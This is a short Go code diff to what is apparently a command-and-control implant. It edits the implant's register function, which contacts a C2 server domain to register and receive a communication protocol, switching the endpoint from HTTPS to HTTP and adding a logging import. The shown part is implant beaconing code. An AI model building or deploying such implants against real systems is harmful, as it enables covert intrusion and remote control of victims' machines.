@@ -7,6 +7,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"log"
 	"math/rand"
 	"net/http"
 	"time"
@@ -46,8 +47,8 @@ func NewImplant() (*Implant, error) {
 
 // register contacts the /register, fills impl.ID, and returns the c2's chosen communication protocol
 func (i *Implant) register() (string, error) {
-	endpoint := "https://" + C2Domain + C2RegisterEndpoint
-
+	// TODO: should be http://
+	endpoint := "http://" + C2Domain + C2RegisterEndpoint
 	body, err := json.Marshal(i)
 	if err != nil {
 		return "", fmt.Errorf("marshal payload: %w", err)
